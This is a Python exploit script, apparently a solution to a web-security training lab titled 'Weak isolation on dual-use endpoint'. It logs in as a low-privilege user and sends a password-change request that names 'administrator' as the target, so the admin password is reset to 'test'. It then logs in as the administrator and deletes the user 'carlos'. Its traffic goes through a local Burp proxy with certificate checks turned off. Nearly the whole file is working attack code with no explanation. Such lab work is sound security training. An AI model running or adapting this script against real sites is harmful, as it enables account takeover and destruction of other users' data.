# Problem -> Weak isolation on dual-use endpoint

import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Defining proxy for burpsuite

proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

# Function for csrf tokens
def get_csrf(s,url):
    res = s.get(url,verify=False,proxies=proxies)
    soup = BeautifulSoup(res.text,'html.parser')
    csrf = soup.find('input',{'name':'csrf'})['value']
    return csrf

def change_administrator_pass(s,url):
    login_url = url + '/login'
    csrf_token = get_csrf(s,login_url)
    login_data = {
        'csrf':csrf_token,
        'username':'wiener',
        'password':'peter'
    }
    res = s.post(login_url,data=login_data,verify=False,proxies=proxies)
    
    if "Log out" in res.text:
        print("[+] Successfullly LoggedIn as wiener")

        #changing admin password
        pass_changeurl = url + '/my-account/change-password'
        csrf_tokken = get_csrf(s,url+'/my-account')
        pass_data = {
            'csrf':csrf_tokken,
            'username':'administrator',
            'new-password-1':'test',
            'new-password-2':'test'
        }
        res = s.post(pass_changeurl,data=pass_data,verify=False,proxies=proxies)
        if "Password changed successfully" in res.text:
            print("[+] Successfully Changed administrator password")
        else:
            print('[+] Unable to change admin password')


    else:
        print("Unable to log in")

def delete_carlos(s,url):
    login_url = url + '/login'
    csrf_token = get_csrf(s,login_url)
    login_data = {
        'csrf':csrf_token,
        'username':'administrator',
        'password':'test'
    }
    res = s.post(login_url,data=login_data,verify=False,proxies=proxies)
    if "Log out" in res.text:
        print("Successfuly loged in as administratot")
        delete_url = url + '/admin/delete?username=carlos'
        res = s.get(delete_url,verify=False,proxies=proxies)
        if "Congratulations" in res.text:
            print("Successfully delete the user carlos")
        else:
            print("Unable to delete carlos")


    else:
        print("Unable to log in as administartor")

def main():
    if len(sys.argv) != 2:
        print('[+] Usage : python3 {} <target-url>'.format(sys.argv[0]))
    else:
        #normal user session as s1
        s1 = requests.Session()
        s2 = requests.Session()
        url = sys.argv[1]
        change_administrator_pass(s1,url)
        delete_carlos(s2,url)

if __name__ == '__main__':
    main()